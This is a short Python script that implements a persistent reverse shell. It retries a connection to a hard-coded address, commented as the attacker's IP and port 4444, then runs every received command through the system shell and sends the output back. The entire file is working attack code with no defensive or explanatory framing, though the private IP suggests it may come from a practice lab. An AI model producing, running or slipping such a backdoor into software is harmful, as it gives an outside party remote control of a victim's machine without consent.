# Importing necessary libraries
import socket
import time
import subprocess

# Function to establish a persistent reverse shell connection
def connectBackToMe():
	while True:
		try:
			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			soc.connect(("10.0.2.15", 4444)) # Attacker's IP and port
			break
		except:
			time.sleep(5) # Retry connection after 5 seconds if it fails
	while True:
		shellCmd = soc.recv(1024).decode()
		if shellCmd.lower() == "exit":
			soc.close()
			break
		# Executing the command and sending the output back to the attacker
		toMe = subprocess.run(shellCmd, shell=True, capture_output=True)
		soc.send(toMe.stdout + toMe.stderr)

if __name__ == "__main__":
    connectBackToMe()
